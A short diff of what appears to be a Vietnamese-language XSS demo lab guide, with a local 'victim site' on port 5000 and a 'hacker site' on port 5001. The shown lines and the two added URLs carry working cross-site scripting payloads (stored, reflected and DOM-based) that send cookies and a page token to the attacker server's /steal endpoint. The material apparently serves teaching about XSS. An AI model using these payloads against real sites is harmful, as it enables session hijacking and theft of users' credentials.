@@ -130,7 +130,9 @@ Chen vao comment tren victim site:
 new Image().src='http://127.0.0.1:5001/steal?cookie='+encodeURIComponent(document.cookie);
 </script>
 ```
+http://127.0.0.1:5000/?search=%3Cscript%3E+new+Image%28%29.src%3D%27http%3A%2F%2F127.0.0.1%3A5001%2Fsteal%3Fcookie%3D%27%2BencodeURIComponent%28document.cookie%29%3B+%3C%2Fscript%3E
 
+http://127.0.0.1:5000/profile#%3Cimg%20src%3Dx%20onerror%3D%22fetch%28%27http%3A%2F%2F127.0.0.1%3A5001%2Fsteal%3Ftoken%3D%27%2Bdocument.getElementById%28%27demoToken%27%29.innerText%29%22%3E
 ## 7) Quy trinh demo
 
 1. Mo hacker site tren localhost:5001.
